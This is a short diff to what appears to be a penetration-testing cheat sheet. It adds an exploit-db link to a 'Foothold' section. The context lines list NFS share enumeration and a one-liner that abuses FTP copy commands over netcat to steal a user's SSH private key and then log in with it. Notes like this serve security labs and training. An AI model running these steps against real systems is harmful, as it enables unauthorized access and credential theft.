@@ -575,11 +575,12 @@ Foothold:
 		- If mountd is running: 
 			- showmount -e <victim IP>
 			- mount -t nfs <victim IP>:/ our_temperory_folder_name/ -no lock
-				- FTP commands
+				- FTP commands: https://www.exploit-db.com/exploits/36803
 					- One liner: nc <victim IP> then cpfr /home/<user>/.ssh/id_rsa then cpto
 /var/tmp/id_rsa
 					- chmod 600 id_rsa
 					- ssh -i id_rsa <user>@<iP>
+					
 			
 					
 		
